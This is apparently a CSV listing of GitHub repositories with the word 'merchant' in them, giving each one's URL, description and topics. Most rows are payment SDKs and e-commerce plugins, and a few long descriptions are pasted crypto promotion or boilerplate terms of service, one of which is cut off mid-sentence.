0,https://github.com/SpectroFinance/SpectroCoin-Merchant-API.git,SpectroCoin Bitcoin merchant API specification,,3
0,https://github.com/RazerMS/rms-mobile-xdk-cordova.git,"Razer Merchant Services mobile payment for Cordova (Plugin) (IONIC, Framework7 Compatible)",,3
0,https://github.com/Makewebbetter/points-and-rewards-for-woocommerce.git,"Points and Rewards for WooCommerce plugin help merchants to improve their brand value and retain customers by setting up a points-based loyalty program for their online stores. With this plugin, merchants can reward their loyal customers by awarding points on their online activities. Customers can further redeem earned points for rewards.","points,rewards,points-and-rewards,loyalty,woocommerce",3
0,https://github.com/ferhan/AmazonOrders.git,"Retrieve order history for a merchant, using Amazon Orders API.",,3
0,https://github.com/Platron/platron_merch_reference.git,Platron merchant reference,,3
0,https://github.com/segsalerty2013/opay-merchant-cashier-php.git,Merchant Pre-Order API,,3
0,https://github.com/Oceania2018/Coinbase.NetSDK.git,".NET SDK for Full APIs of Coinbase including Wallet, Merchant and Data Endpoints. ",,3
0,https://github.com/usmanasif/Active-Merchant-Paypal-Recurring-payment-support-for-rails-2.x.git,Active Merchant Paypal Recurring payment support for rails 2.x,,3
0,https://github.com/ing-bank/ing-ideal-connectors-java.git,Opensource tools and API to connect webshops and merchants to ING using iDeal ,,3
0,https://github.com/parkersmith/payment_manager.git,Convenience wrapper for the ruby gem active_merchant,,3
0,https://github.com/TeleKeks/merchant.bas.git,"{""Merchant's Quest - the TeleBASIC game""}",,3
0,https://github.com/RapidSoftwareSolutions/Marketplace-Foursquare-Package.git,"{""The Foursquare API gives you access to our world-class places database and the ability to interact with Foursquare users and merchants. Start using the only location API you'll ever need.""}",,3
0,https://github.com/TarkusGSA/LumiRoMerchantsAndroid.git,LumiRo Merchants Monitoring for Android,,3
0,https://github.com/turrgavi/MerchantQR-Nano.git,Python based QR code generator for merchants.,,3
0,https://github.com/princetonmerchants/pma.git,Website for the Princeton Merchants Association,,3
0,https://github.com/rahuldadhich/productxmlfeed.git,Magento 1.x - Product XML feed for Google Merchant Center,,3
0,https://github.com/satels/django-zpayment.git,Integral Online ZPayment Merchant Interface support for Django,,3
0,https://github.com/button/button-merchant-ios.git,An open source client library for Button merchants. ,,3
0,https://github.com/ashleygrush/plaid_loyalty.git,A loyalty tracking API for users and merchants.,,3
0,https://github.com/marcialpaulg/BuxPHP.git,BuxPHP is a PHP library for Bux.ph merchants,,3
0,https://github.com/VSKut/WebMoney-Merchant.git,WebMoney Merchant - PHP Library,,3
0,https://github.com/LklCBPay/api.git,api doc for merchant,,3
0,https://github.com/ragnarak54/DiscordBot.git,Traveling merchant discord bot,,3
0,https://github.com/AudithSoftworks/Nexway-Merchant-API-PHP-Client.git,Nexway Merchant API PHP Client,,3
0,https://github.com/tonyynot/usenano.git,Merchant portal for Nano cryptocurrency,"cryptocurrency,nano-cryptocurrency,merchant-portal,jekyll",3
0,https://github.com/webgriffe/SyliusItalianInvoiceableOrderPlugin.git,Sylius plugin which allows Italian merchants to collect invoice data for their orders.,sylius,3
0,https://github.com/bencoderus/laravel-webhook.git,Laravel webhook allows businesses to send webhooks to their merchants/clients with ease. ,"laravel,php,php7,webhook,composer,laravel8",3
0,https://github.com/drager/swish.git,Rust API bindings for the Swish API. https://developer.getswish.se/merchants/,"swish,payment,api-bindings,rust-library,rust",3
0,https://github.com/mivaecommerce/api-sdk-node.git,Miva Merchant JSON API SDK for NodeJS,,3
0,https://github.com/openstream/OSCOM2PostFinance.git,osCommerce Online Merchant 2.2 PostFinance Module,,3
0,https://github.com/null-none/simpla-google-merchant.git,Generate feed for merchant for CMS simpla,,3
0,https://github.com/hiqdev/omnipay-paypal.git,PayPal plugin for PHP merchant library,hacktoberfest,3
0,https://github.com/BrainyWayne/Mobile-Money-Merchant.git,Mobile money merchant locator using realtime GPS,,3
0,https://github.com/akelos/active-merchant.git,Active Merchant for Akelos PHP Framework,,3
0,https://github.com/hulucat/wechat-mch.git,ÊúçÂä°ÂïÜÊ®°Âºè‰∏ãÁöÑÂæÆ‰ø°ÂºÄÂèëSDK„ÄÇA Sdk for merchant model of wechat development.,,3
0,https://github.com/integrationmonitoring/moneta-python3-sdk.git,Python3 SDK to create moneta merchant API driven application,,3
0,https://github.com/calvinfroedge/Codeigniter-Aktive-Merchant.git,Implementation of Aktive Merchant by Andreas Kollaros (PHP),,3
0,https://github.com/raysrashmi/active_merchant.git,extended active merchant plugin to support beanstream APIs...,,3
0,https://github.com/icerockdev/tinkoff-merchant-api.git,Tinkoff Merchant API Kotlin Client - part of BOKO libs,"kotlin,kotlin-jvm,tinkoff,backend",3
0,https://github.com/KiezelPay/fitbit_kpay_merchant_api.git,Library to get the data available via the K¬∑pay merchant API and use it in an app or clockface (https://kiezelpay.com/api/merchant/documentation/),,3
0,https://github.com/thenifemi/petShopMerchant.git,Pet Shop Merchant is a merchant application for the Pet Shop e-commerce application for Android built with Flutter (iOS to come soon). ,,3
0,https://github.com/JoseAlba/BitBuy.git,"Merchants who register on the site will have the ability to set up their own accounts for selling their own digital products or services in exchange for Bitcoin. Likewise, consumers who are in the market for purchasing digital content will have the ability to interface with these merchants and set up an exchange for goods and services.",,3
0,https://github.com/clearhaus/applepaymerchant.git,Clearhaus Apple Pay merchant used internally for testing our Apple Pay compatibility,,3
0,https://github.com/twanvl/sts-shop-mod.git,"{""Modifies the merchant's shop, allowing you to buy more items""}",,3
0,https://github.com/jessesadler/jdo-sterfhuis.git,A digital humanities project on the estate of a 16th-century merchant,"digital-humanities,history,r",3
0,https://github.com/stevenmirabito/tpm-plus.git,"{""A Chrome extension to add additional functionality to The Plastic Merchant's Bulk Seller Platform.""}",,3
0,https://github.com/Wincoinofficial/wincoin.git,"WINCOIN (WC), which is known for its blockchain-based platform which its future development trends and values are also expected to grow and expand in time. The circulation of WC asset are fundamentally reinforced by the strong merchant of lifestyle ecosystem and backed by phenomenal loyal supporters‚Äô from all around the globe.","wincoin,cryptocurrency,bitcoinbased,cryptography,wc",3
0,https://github.com/kancart/Zencart-Web-API-service-by-Kancart.com-Mobile.git,"This is a http/json API service for Zencart (user, address, item, shopping cart, checkout, order, full shopping life cycle support). Kancart.com provide iOS, Android app and Mobile template / theme solution for merchants.",,3
0,https://github.com/ziggr/ESO-MMExtractor.git,Elder Scrolls Online: Lua code to read Master Merchant data and extract useful information to a spreadsheet.,,3
0,https://github.com/VictorZhang2014/Apple-Pay-Demo.git,This is a Apple Pay Demo . If you download it and run it before you must apply yourself Merchant ID.,,3
0,https://github.com/Nsisodia91/myzeeeinc.git,This is basic Project considering one of the shipping API merchant thats been used for making purchase,,3
0,https://github.com/ChowRobin/awm.git,"The api of the takeaway application, based on Spring, is provided to the user client and the merchant client data api.","springboot,takeaway",3
0,https://github.com/shopgate/cart-integration-sdk.git,"The Shopgate Cart Integration SDK (formerly: Shopgate Library) is a compilation of classes to manage the communication between your shop system and Shopgate via the Shopgate Plugin API and the Shopgate Merchant API. The SDK provides methods for processing incoming and outgoing requests, configuration options and for handling errors.",,3
0,https://github.com/developersteve/WooCommerce-PayPal-Here.git,"This is a basic plugin to allow PayPal Here, to be used with WooCommerce for use in popup stores or self serve booths this allows a merchant to be able to quickly and easily accept in-person credit cards ",,3
0,https://github.com/StocksExchange/swift-client.git,"{""STEX (former Stocks.Exchange) provides all the core exchange functionality, and additional merchant tools available via the HTTP API where all returned messages are in model class. It's much easier to work with the API by using one of the clients provided by STEX, so while this page describes the API in case you want or need to build your own client, the examples use the Swift client.""}",,3
0,https://github.com/libsv/payd.git,"Payd is a work in progress reference implementation of the Payment Protocol/BIP (2)70 which defines a method for handling payment requests from users and the user fulfilling that request. A classic example being a merchant who owns a shop taking payments from customers. It does not run a full node to validate transaction inputs, rather, it will utilise SPV and the Headers Client to leverage merkle proof validation and broadcast using mAPI.","bsv,bitcoin,merchant,golang,spv,liteclient,mapi",3
0,https://github.com/robertoashworth/How-to-integrate-Neteller-Payment-method-on-your-App.git,"How to integrate Neteller Payment method on your App   Neteller.com became one of the most popular payment gateways . There are a lot of merchants depend on Neteller as a main payment method for their customers .    How Do Neteller Payment Gateways Work? (1)The cuthstomer places an order on your website by pressing the ""Submit Order"" or equivalent button, or perhaps enters their card details using an automatic phone answering service.    (2) If the order is via Application, the customer\'s phone browser encrypts the information to be sent between the browser and the merchant\'s web server through a secure socket layer.     (3)Subsequently, the merchant then forwards the transaction details to their payment gateway like Neteller , through a secure socket layer again.  (4) Afterwards, the payment gateway sends the transaction information to the payment processor used by the merchant\'s acquiring bank.    (5) Then the payment processor transfers the transaction info to the card association (Visa / Master card).   (6) To get the payment to your Neteller account, you must link a valid credit card with it either Master or Visa.   7) In an intra-transaction from Neteller to Neteller account, it is important that both accounts have valid credit cards for the transaction to go smoothly. Once the buyer makes a payment through Neteller, the amount will be deducted from their credit card balance and the seller will see the value added in their credit card directly.    (8) Protect your account and make sure that the payment goes to your valid credit card on your Neteller accounts. You must enter CVV/CVS number when entering the credit card details as the number is linked to the API created between application and Neteller accounts. Once the link is established then every transaction is going to be checked by matching the number for the transaction to go smoothly.         ( 9 ) After you get the payment to your credit card account, you will have 3 options:  The first is that you can withdraw the funds through ATM.  The second is that you can transfer the funds to your bank account.  The third is that you can deposit the funds into your Neteller account.",,3
0,https://github.com/BlockchainLabs/HiCoin.git,"Start Of Efficient Digital HIcoin HICoin has many features and advantages.  It has an ideal HIcoin to transfer anywhere, anytime money to friends HIcoin is a Pos(proof-of-stake) Internet currency that enables instant, near-zero cost payments to anyone in the world.    HIcoin‚Äôs Key Features HIcoin features faster transaction confirmation times and improved storage efficiency than the leading math-based currency.  HIcoin is open-source; its design is public, nobody owns or controls HIcoin and everyone can take part.  HIcoin network does not require the use of large-scale, specialized hardware operations.  HIcoin is far more energy-efficient than traditional digital currency networks.  Wallet encryption allows you to secure your wallet, so that you can view transactions and your account balance, but are required to enter your password before spending HIcoins.  This provides protection from wallet-stealing viruses and trojans as well as a sanity check before sending payments. Look for hicoin in more point of sale applications soon with recent addition to merchant services.    SPECIFICATIONS   / POS INTEREST: PoS (Proof-of-Stake) 5% yearly (from non-reserved wallet balance)  / ALGORITHM: Scrypt  / SYMBOL: XHI  / BLOCK TIME: 60 sec  / LAST POW BLOCK: 3600  / TOTAL MONEY SUPPLY: 10,000,000,000 XHI  / BLOCK REWARD: BLOCKS 1-10 (premine): each 1,000,000,000 XHI / BLOCKS 11~3600: 100 XHI  / COIN POS AGE: Min. 1 hour / Max. unlimited  / RPC PORT: 35288 (testnet 45288 )  / P2P PORT: 35289 (testnet 45289 )  / Coin maturity: 100 confirmations | KEY FEATURES Security and control over your money secure against the attacks other digital currencies face due to their reliability on large-scale mining operations  Fast international payments HICoin is the ideal digital currency for face to face transactions and all applications that value speed.  1% compound interest yearly You will earn rewards every few days, depending on the size of your holdings, adding up to 5% interest yearly.  FEATURES MESSAGES Big Miners Back Bitcoin Classic As Scaling Debate Evolves Following a months-long debate on how best to scale the bitcoin network to accommodate a greater number of transactions, bitcoin mining firms are voicing their support for a newly introduced proposal called Bitcoin Classic. Though a new entrant to the debate, Bitcoin Classic so far has the support of bitcoin developers including former Bitcoin Core  Read More admin  01/19/2016  - 5 Must-Read Excerpts from the UK Government‚Äôs Blockchain Report ‚ÄúThe progress of mankind is marked by the rise of new technologies and the human ingenuity they unlock.‚Äù That‚Äôs the glowing foreword to a new report on blockchain and distributed ledger tech issued by the UK government‚Äôs Chief Scientific Adviser this week. Taking a positive outlook on the emerging technology, the document recommends a broad government initiative to develop and demonstrate blockchain and distributed  Read More admin  01/19/2016  - Is Digital Asset‚Äôs $50 Million Funding a Blow to Bitcoin? VCs Weigh In Founded in 2014 and led by CEO and ex-JP Morgan executive Blythe Masters, Digital Asset Holdings had long been the subject of speculation that suggested that, despite its high-profile leadership, the startup was having difficulties raising an initial funding round. All that uncertainty was laid to rest last week, however, when Digital Asset silenced rumors  Read More admin  01/12/2016  0 Our Team Project Manager TIMO SPRAY  Business Development JASON LANE  Art Director TONYA GARCIA  Account Manager ASHLEY SUJAN It Has An Ideal Hicoin To Transfer Anywhere, Anytime Money To Friends. WALLET ",,3
0,https://github.com/mdxedia/Awsome-Cash.git,"Updated January 2016  Note on translation: These Website Terms of Service may have been translated into various languages for the convenience of Cash Loophole Users. While the translation is correct to the best of Cash Loophole knowledge, Cash Loophole is not responsible or liable in the event of an inaccuracy. English is the controlling language of these Terms of Service, and any translation has been prepared for you as a courtesy only. In the event of a conflict between the English-language version of these Terms of Service and a version that has been translated into another language, the English-language version shall control.  The Cash Loophole Website, is an online information service with downloadable software, provided by Cash Loophole, and is subject to the terms and conditions set forth below.  IMPORTANT: These terms and conditions constitute a legal agreement between you, the User (hereafter ‚ÄúYou‚Äù, ‚ÄúYour‚Äù, or the ‚ÄúUser‚Äù), and us, Cash Loophole, its affiliates, and all of their respective authorized representatives, officers, directors, employees, agents, shareholders, licensors, attorneys, successors, and assigns (hereafter ‚ÄúUs‚Äù or ‚ÄúCash Loophole‚Äù), and together with the Website Privacy Policy and the Software License Agreement, wholly and exclusively govern such relationship.  BEFORE ACCESSING OR USING THE SERVICES OFFERED ON FIVEMINUTEEXPERIMENT.CO, PLEASE READ CAREFULLY THE FOLLOWING TERMS AND CONDITIONS CONTAINED IN THIS WEBSITE TERMS OF SERVICE AGREEMENT. THESE TERMS GOVERN YOUR ACCESS TO AND USE OF THE SITE AND ANY PROGRAMS, SERVICES, TOOLS, SOFTWARE, MATERIALS, OR OTHER INFORMATION AVAILABLE THROUGH THE SITE OR USED IN CONNECTION THEREWITH (collectively, ‚Äúthe Site‚Äù). Cash Loophole IS WILLING TO LICENSE AND ALLOW THE USE OF THIS SITE ONLY ON THE CONDITION THAT YOU ACCEPT AND AGREE TO ALL OF THE TERMS AND CONDITIONS CONTAINED THEREIN. BY USING THE SITE, YOU THEREFORE AGREE TO BE BOUND BY THE TERMS AND CONDITIONS SET FORTH BELOW. IF YOU DO NOT WISH TO BE BOUND BY THESE TERMS AND CONDITIONS, YOU ARE NOT GRANTED PERMISSION TO ACCESS OR OTHERWISE USE THE SITE AND ARE INSTRUCTED TO EXIT THE SITE IMMEDIATELY.  Cash Loophole RESERVES THE RIGHT TO MODIFY THIS AGREEMENT AT ANY TIME, WITHOUT NOTICE TO THE USER, AND SUCH MODIFICATIONS SHALL BE EFFECTIVE IMMEDIATELY UPON POSTING OF THE MODIFIED TERMS AND CONDITIONS ON THE SITE. YOU AGREE TO REVIEW THE AGREEMENT PERIODICALLY TO BE AWARE OF SUCH MODIFICATIONS AND YOUR CONTINUED ACCESS OR USE OF THE SITE SHALL BE DEEMED YOUR CONCLUSIVE ACCEPTANCE OF THE MODIFIED AGREEMENT. Revised versions of the Terms and Conditions shall be indicated by the date posted at the top of the Website Terms of Service page (i.e., ‚ÄúUpdated [Date]‚Äù).  PROPRIETARY RIGHTS. All intellectual property of or relating to the Site, including but not limited to content, information, patents, trademarks, copyrights, modules, techniques, know-how, computer code (including html code), algorithms, methods of doing business, user interfaces, graphic design, look and feel, and software; and all developments, derivatives, and improvements thereto, whether registered or not (collectively, ‚ÄúIntellectual Property‚Äù), unless otherwise indicated, are owned, controlled and licensed in their entirety by Cash Loophole, its affiliates, its successors and assigns, and/or by third parties who have granted Cash Loophole license to use such Intellectual Property. Publications, products, content or services referenced herein or on the Site are the exclusive trademarks or service-marks of Cash Loophole or their respective owners and are protected by law. Except as expressly provided herein, Cash Loophole does not grant any express or implied right to You or any other person under any intellectual or proprietary rights. Any downloadable or printable software, programs, information or materials available through the Site and all copyrights, trade secrets, and know-how related thereto, unless otherwise indicated, are owned by Cash Loophole or third party licensors. The website name, Cash Loophole, its logo, and all other names, logos and icons identifying the Cash Loophole website and its services are proprietary trademarks of Cash Loophole, and any use of such marks, such as domain names, without the express written permission of Cash Loophole is strictly prohibited. LIMITED LICENSE GRANT. The Site is provided by Cash Loophole, and conditional with the acceptance of this Website Terms of Service Agreement, provides You with a personal, revocable, limited, non-exclusive, royalty-free, non-transferable license to use the Site and download any programs, services, tools, materials, or information made available through or from the Site. Please note that access to download and terms of use of Cash Loophole downloadable software is contingent on acceptance of the separate Software License Agreement. The Website Terms of Service permit you to use and access for personal use only the Cash Loophole Website (a) on a single laptop, workstation, or computer and (b) on a mobile device from the Internet or through an on-line network. You may also download information from the Site into your laptop, workstation or computer‚Äôs temporary memory (RAM) and print and download materials and information from the Site solely for your personal non-commercial use, provided that all hard copies contain all copyright and other applicable notices. LICENSE RESTRICTIONS. The foregoing license is limited. YOU MAY NOT MODIFY, COPY, STORE, REPRODUCE, REPUBLISH, UPLOAD, POST, TRANSMIT, LICENSE, SUBLICENSE, DISPLAY, RENT, LEASE, SELL, COMMERCIALLY EXPLOIT, OR DISTRIBUTE, IN ANY MANNER, ANY DATA, INTELLECTUAL PROPERTY OR MATERIAL PROVIDED BY Cash Loophole THROUGH THE SITE, IN ANY MANNER NOT EXPRESSLY PERMITTED BY THESE TERMS OF SERVICE. THE ABOVE RESTRICTION INCLUDES, BUT IS NOT LIMITED TO TEXT, GRAPHICS, CODE AND/OR SOFTWARE. In addition, you may not modify, translate, decompile, create any derivative work(s) of, disassemble, broadcast, publish, remove or alter any proprietary notices or labels, grant a security interest in, or otherwise use the Site in any manner not expressly permitted herein. Moreover, you may not (i) use any ‚Äúdeep link,‚Äù ‚Äúpage scrape,‚Äù ‚Äúrobot,‚Äù ‚Äúspider‚Äù or other automatic device, program, script, algorithm, or methodology, or any similar or equivalent manual process, to access, acquire, copy, or monitor any portion of the Site or in any way reproduce or circumvent the navigational structure or presentation of the Site to obtain or attempt to obtain any materials, documents, or information through any means not purposely made available through the Site, OR (ii) attempt to gain unauthorized access to any portion or feature of the Site, including, without limitation, the account of any other Authorized User(s), any other systems or networks connected to the Site or its servers, to any of the services offered on or through the Site, by hacking, password ‚Äúmining‚Äù, or any other illegitimate or prohibited means, OR (iii) probe, scan or test the vulnerability of the Site or any network connected to the Site, nor breach the security or authentication measures on the Site or any network connected to the Site, OR (iv) reverse look-up, trace, or seek to trace any information on any other Authorized User of or visitor to the Cash Loophole Site, OR (v) take any action that imposes an unreasonable or disproportionately large load on the infrastructure of the Site, the system, networks, or any systems or networks connected thereto, OR (vi) use any device, software, or routine to interfere with the proper working of the Site or transaction conducted on the Site, or with any other person‚Äôs use of the Site, OR (vii) forge headers, impersonate a person, or otherwise manipulate identifiers in order to disguise your identity or the origin of any message or transmittal you send to Cash Loophole on or through the Site, OR (viii) use the Site to collect e-mail addresses or other contact or personal information, OR (ix) market, co-brand, private label, appropriate, use the Cash Loophole name, or a name similar thereto on a different domain, separately distribute, resell, or otherwise permit third parties to access and use the Site, in whole or in part, without the express, separate and prior written permission of Cash Loophole, OR (x) use the Site in any other unlawful manner or in a manner that could be perceived to damage, disparage, or otherwise negatively impact Cash Loophole. 4.Moreover, this license is only valid where Cash Loophole is permitted to operate. Access to and use of this site in contravention of any laws or regulations, or where prohibited by law, is unauthorized and not permitted by Cash Loophole. THIRD PARTY INFORMATION/ PRODUCTS/ SERVICES/ LINKS TO OTHER SITES. The Site may contain information, data, links, promotional offers, or other content in any form, including financial information related to third parties. Such information is provided only for Your convenience and as a bonus service, and will not be considered financial advisement. In no case whatsoever shall Cash Loophole be liable for such content or any damages or losses that result from reliance thereon. You understand that, except for information, products or services clearly identified as being supplied by Cash Loophole, Cash Loophole is not affiliated with, is not responsible for, and does not operate, control or endorse any information, products or services offered by third parties that are provided on the Site in any way. Cash Loophole makes no representations whatsoever, nor does it guarantee or endorse, the quality, non-infringement, accuracy, completeness or reliability of such third-party materials, programs, products displayed on this Site or which You may access through a link on this Site. Your correspondence or any other dealings with such third parties found on this Site are solely between you and such third party. Accordingly, Cash Loophole EXPRESSLY DISCLAIMS RESPONSIBILITY FOR THE CONTENT, MATERIALS, ACCURACY, AND/OR QUALITY OF THE INFORMATION, PRODUCTS AND/OR SERVICES AVAILABLE THROUGH OR ADVERTISED ON THESE THIRD-PARTY WEBSITES. DISCLAIMER ‚Äì NO WARRANTIES. You understand and accept that Cash Loophole cannot and does not guarantee or warrant that files available for downloading through the Site will be free of infection or viruses, worms, Trojan horses or other code that manifest contaminating or destructive properties. You are responsible for implementing sufficient procedures and checkpoints on your personal computer to satisfy your particular requirements for accuracy of data input and output, and for maintaining a means external to the Site for the reconstruction of any lost data.YOU UNDERSTAND AND AGREE TO ASSUME TOTAL RESPONSIBILITY AND RISK FOR YOUR USE OF THE SITE. Cash Loophole PROVIDES THE SITE AND RELATED INFORMATION ‚ÄúAS IS‚Äù AND DOES NOT MAKE ANY EXPRESS OR IMPLIED WARRANTIES, REPRESENTATIONS OR ENDORSEMENTS WHATSOEVER. Cash Loophole SPECIFICALLY DISCLAIMS ANY IMPLIED WARRANTIES OF TITLE, MERCHANTABILITY, FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. WITH REGARD TO THE SITE, THE PERSONAL ACCOUNT REPRESENTATIVE SERVICE, OR ANY INFORMATION OR THIRD-PARTY INFORMATION OR LINKS PROVIDED THEREON, Cash Loophole SHALL NOT BE LIABLE FOR ANY COST OR DAMAGE ARISING EITHER DIRECTLY OR INDIRECTLY FROM ANY SUCH TRANSACTION. IT IS SOLELY YOUR RESPONSIBILITY TO EVALUATE THE ACCURACY, COMPLETENESS AND USEFULNESS OF ALL OPINIONS, ADVICE, SERVICES, MERCHANDISE AND OTHER INFORMATION PROVIDED THROUGH THE SERVICE. Cash Loophole DOES NOT WARRANT THAT THE SERVICE WILL BE UNINTERRUPTED OR ERROR-FREE OR THAT DEFECTS IN THE SERVICE WILL BE CORRECTED. YOU UNDERSTAND FURTHER THAT THE PURE NATURE OF THE INTERNET CONTAINS UNEDITED MATERIALS SOME OF WHICH ARE SEXUALLY EXPLICIT OR MAY BE OFFENSIVE TO YOU. YOUR ACCESS TO SUCH MATERIALS IS AT YOUR OWN RISK. Cash Loophole HAS NO CONTROL OVER AND ACCEPTS NO RESPONSIBILITY WHATSOEVER FOR SUCH MATERIALS. LIMITATION OF LIABILITY. YOU EXPRESSLY ABSOLVE AND RELEASE Cash Loophole FROM ANY CLAIM OF HARM RESULTING FOR A CAUSE BEYOND Cash Loophole CONTROL, INCLUDING BUT NOT LIMITED TO FAILURE OF ELECTRONIC OR MECHANICAL EQUIPMENT OR COMMUNICATION LINES FOR ANY REASON, SUCH AS MAINTENANCE, DENIAL OF SERVICE ATTACKS, TELEPHONE OR OTHER COMMUNICATION PROBLEMS, COMPUTER VIRUSES, UNAUTHORIZED ACCESS, THEFT, OPERATOR ERRORS, FORCE MAJEURE EVENT SUCH AS SEVERE WEATHER, EARTHQUAKES, NATURAL DISASTERS, STRIKES, LABOR PROBLEMS, WARS, OR GOVERNMENTAL RESTRICTION OR ACTION. MOREOVER, IN NO EVENT WILL Cash Loophole BE LIABLE FOR ANY INCIDENTAL, CONSEQUENTIAL, INDIRECT, PUNITIVE, OR SPECIAL DAMAGES (INCLUDING, BUT NOT LIMITED TO, DAMAGES FOR LOSS OF PROFITS, BUSINESS INTERRUPTION, LOSS OF PROGRAMS OR INFORMATION, AND THE LIKE) ARISING OUT OF OR IN ANY WAY CONNECTED WITH THE USE OF OR INABILITY TO USE THE SITE‚ÄôS SERVICE, OR ANY INFORMATION, OR TRANSACTIONS PROVIDED OR DOWNLOADED FROM THE SITE, OR ANY DELAY OF SUCH INFORMATION OR SERVICE, EVEN IF Cash Loophole HAS BEEN ADVISED OF THE POSSIBILITY OF SUCH DAMAGES, OR ANY CLAIM ATTRIBUTABLE TO ERRORS, OMISSIONS, OR OTHER INACCURACIES IN THE SITE AND/OR MATERIALS OR INFORMATION DOWNLOADED THROUGH THE SITE. BECAUSE SOME JURISDICTIONS DO NOT ALLOW THE EXCLUSION OR LIMITATION OF LIABILITY FOR CONSEQUENTIAL OR INCIDENTAL DAMAGES, THE ABOVE LIMITATION MAY NOT APPLY TO YOU. NOTWITHSTANDING THE FOREGOING, TOTAL LIABILITY OF Cash Loophole FOR ANY REASON RELATED TO USE OF THE SITE SHALL NOT EXCEED THE TOTAL AMOUNT PAID BY YOU TO Cash Loophole IN CONNECTION WITH THE SUBJECT MATTER OF THE PARTICULAR DISPUTE DURING THE PRIOR THREE MONTHS. INDEMNIFICATION.You agree to indemnify, defend and hold harmless Cash Loophole, its affiliates, and all of their respective officers, directors, employees, agents, licensors, attorneys, successors, and assigns from and against all claims, proceedings, injuries, liabilities, losses, damages, costs, and expenses, including reasonable attorneys‚Äô fees and litigation expenses, relating to or arising from any breach or violation of this Agreement by You (including negligent or reckless conduct). Each of the above referenced individuals or entities reserves the right to assert and enforce these provisions directly against you, on their own behalf. USER OBLIGATIONS. If you provide any false, inaccurate, untrue, or incomplete information, Cash Loophole reserves the right to terminate immediately Your access to and use of the Site and any downloadable software. You agree to abide by all applicable local, state, national, and international laws and regulations with respect to Your use of the Site and its related services. In addition, You acknowledge and agree that use of the Internet and access to or transmissions or communications with the Site is solely at your own risk. While Cash Loophole has endeavored to create a secure and reliable Site, you should understand that the confidentiality of any such communications cannot be guaranteed. Accordingly, Cash Loophole is not responsible for the security, or any breach thereof, of any information transmitted to or from the Site. You agree to assume all responsibility concerning activities related to Your use of the Site, including but not limited to obtaining and paying for all licenses and costs for third-party software and hardware necessary for implementation of the Site and its downloadable software, and maintaining or backing up any data. 10. USER NAME AND PASSWORD POLICY. Registration as an authorized user for access to certain areas of the Site may require both a user name and password. Only one authorized user can use one user name and password and account. Multiple accounts registered by the same individual or entity is not permitted and may result in one, some or all accounts being closed by Cash Loophole. By using the Site, you agree to keep your user name and password as confidential information. You also agree not to use another authorized user‚Äôs account. Should you become aware of any loss or theft of your password or any unauthorized use of your name and password, you will immediately notify Cash Loophole. Cash Loophole cannot and will not be liable for any loss or damage arising from your failure to comply with these obligations. Cash Loophole also reserves the right to delete or change (with notice) a user name or password at any time and for any reason. FEEDBACK AND SUBMISSIONS. You grant to Cash Loophole team the right to use your name in connection with any materials freely submitted by You and any other information as well as in connection with all advertising, marketing and promotional material related thereto. You agree that you shall have no recourse against Cash Loophole for any alleged or actual infringement or misappropriation of any proprietary right in your communications with the Site. Registered Site Users will have the opportunity to submit feedback and information regarding their trading activity through the software and through the website, which will be subsequently displayed on the website on an anonymous basis. Such information is submitted on a voluntary basis. Cash Loophole maintains no control over the accuracy or correctness of such self-reporting and accordingly disclaims all liability from User reliance on this data. PRIVACY POLICY. You understand, acknowledge and agree that the operation of certain programs, services, tools, materials, or information of the Site requires the submission, use and dissemination of various personal identifying information. Accordingly, if you wish to access and use those programs, services, tools, materials, or information on the Site, you acknowledge and agree that your use of the Site will constitute acceptance of Cash Loophole personal identifying information collection and use practices to protect your personal information. Please read our Privacy Policy before providing any personal data on this Site. VOID WHERE PROHIBITED. Any offer for any product or service made on this Site is void where prohibited. Moreover, Cash Loophole makes no representations regarding the legality of access to or use of the Site or its content in any country. Although the Site may be accessible worldwide, not all features, products or services provided or offered through or on the Site are appropriate or available for use in all countries. Cash Loophole reserves the right to limit, in its discretion, the provision and quantity of any feature, product or service to any person or geographic area. If You access the Site from a jurisdiction where prohibited, You do so at your own risk and You are solely responsible for complying with all applicable local regulations. People under 18 years of age are not permitted to use the Cash Loophole website. 15. NO ADVICE. You acknowledge that neither the Site or the Personal Account Representative service, is not authorized to offer any legal, tax, accounting advice, or recommendation regarding suitability, profitability, investment strategy or other matter. 17. ENFORCING SITE SECURITY. Actual or attempted unauthorized use of this Site may result in criminal and/or civil prosecution. Cash Loophole reserves the right to view, monitor, and record activity on the Site without notice or permission from the User, including, without limitation, by archiving notices or communications sent by you through the Site. In addition, Cash Loophole reserves the right, at any time and without notice, to modify, suspend, terminate or interrupt operation of or access to the Site, or any portion thereof, in order to protect the Site or Cash Loophole business. NOTICE OF SECURITY BREACH. In addition to the indemnification obligation stated in these Terms of Service, if you become aware of a breach or potential breach of security with respect to any personally identifiable information provided to or made available by Cash Loophole, or any unauthorized hacking of the Site, you shall (i) immediately notify Cash Loophole of such breach or potential breach, (ii) assist Cash Loophole as reasonably necessary to prevent or rectify any such breach, and (iii) enable Cash Loophole to comply with any applicable laws requiring the provision of notice of a security breach with respect to any impacted personally identifiable information. TERM AND TERMINATION. These Terms of Service govern Your right to use the Site will take effect at the moment you access or use the Site and is effective until terminated, as set forth below. This Agreement may be terminated by Cash Loophole without notice, at any time, and for any reason. In addition, Cash Loophole reserves the right at any time and on reasonable grounds, such as any reasonable belief of fraudulent or unlawful activity or actions or omissions that violate any term or condition of these Terms, to deny your access to the Site, in whole or in part, in order to protect its name and goodwill, its business and/or other authorized users, or if you fail to comply with these Terms, subject to the survival rights of certain provisions identified below. Termination is effective without notice. You may also terminate this Agreement at any time by ceasing to use the Site, subject to the survival rights below. Upon termination, You must destroy all copies of any aspect of the Site that you have made and remove downloaded software from Your possession. The following provisions shall survive termination of the Website Terms of Service Agreement for any reason: Proprietary Rights (¬ß1), Limited License Grant (¬ß2), License Restrictions (¬ß3), Third Party Information (¬ß4), Disclaimer (¬ß5), Limitation of Liability (¬ß6), Indemnification (¬ß7), Governing Law (¬ß17), and Miscellaneous (¬ß18). GOVERNING LAW AND DISPUTE RESOLUTION. These Terms of Service and all disputes or claims arising out of or related thereto shall be governed by the laws of Cyprus, without applying conflict of law rules. Any cause of action or claim arising out of use of the Site must be commenced within one (1) year after the claim or cause of action arises, or such claim or cause of action is barred. Claimant and Cash Loophole waive their rights to a jury trial and participation in class action litigation. All disputes arising out of or relating to these Terms of Service shall be resolved by binding arbitration, except that Cash Loophole is not required to arbitrate any dispute regarding confidentiality, infringement, misappropriation, or misuse of any intellectual property right, or any other claim where interim relief from a court is sought to prevent serious and irreparable injury to Cash Loophole or any other person or entity. You acknowledge that any breach, threatened or actual, could cause irreparable injury to Cash Loophole that is not quantifiable in 